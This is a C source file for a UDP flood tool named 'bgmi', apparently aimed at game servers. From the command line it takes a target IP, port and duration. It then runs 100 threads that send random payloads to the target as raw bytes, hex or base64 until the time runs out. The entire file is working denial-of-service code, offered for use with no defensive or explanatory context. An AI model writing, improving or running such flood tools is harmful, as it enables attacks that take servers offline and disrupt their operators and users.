#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <openssl/evp.h>

#define NUM_THREADS 100 // Number of threads
#define MAX_PAYLOAD_SIZE 256 // Max size of a payload

void usage() {
    printf("Usage: ./bgmi ip port time\n");
    exit(1);
}

struct thread_data {
    char *ip;
    int port;
    int time;
};

// Function to generate a random payload
void generate_random_payload(unsigned char *payload, size_t *size) {
    *size = rand() % MAX_PAYLOAD_SIZE + 20; // Random size between 20 and MAX_PAYLOAD_SIZE
    for (size_t i = 0; i < *size; i++) {
        payload[i] = rand() % 256;
    }
}

// Convert payload to hex string
void to_hex(const unsigned char *payload, size_t size, char *hex_output) {
    for (size_t i = 0; i < size; i++) {
        sprintf(hex_output + (i * 2), "%02x", payload[i]);
    }
}

// Convert payload to base64
void to_base64(const unsigned char *payload, size_t size, char *base64_output) {
    EVP_EncodeBlock((unsigned char *)base64_output, payload, size);
}

void *send_packets(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;
    unsigned char payload[MAX_PAYLOAD_SIZE];
    char encoded_payload[MAX_PAYLOAD_SIZE * 2];
    size_t payload_size;
    
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }
    
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->time;
    while (time(NULL) <= endtime) {
        generate_random_payload(payload, &payload_size);
        int mode = rand() % 3;

        if (mode == 0) {
            // Send as raw bytes
            sendto(sock, payload, payload_size, 0, (const struct sockaddr *)&server_addr, sizeof(server_addr));
        } else if (mode == 1) {
            // Send as hex
            to_hex(payload, payload_size, encoded_payload);
            sendto(sock, encoded_payload, strlen(encoded_payload), 0, (const struct sockaddr *)&server_addr, sizeof(server_addr));
        } else {
            // Send as Base64
            to_base64(payload, payload_size, encoded_payload);
            sendto(sock, encoded_payload, strlen(encoded_payload), 0, (const struct sockaddr *)&server_addr, sizeof(server_addr));
        }
    }
    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        usage();
    }
    srand(time(NULL));
    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    
    pthread_t thread_ids[NUM_THREADS];
    struct thread_data data = {ip, port, time};

    printf("Sending packets to %s:%d for %d seconds with %d threads\n", ip, port, time, NUM_THREADS);

    for (int i = 0; i < NUM_THREADS; i++) {
        if (pthread_create(&thread_ids[i], NULL, send_packets, (void *)&data) != 0) {
            perror("Thread creation failed");
            exit(1);
        }
    }
    
    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    printf("Packet sending finished.\n");
    return 0;
}
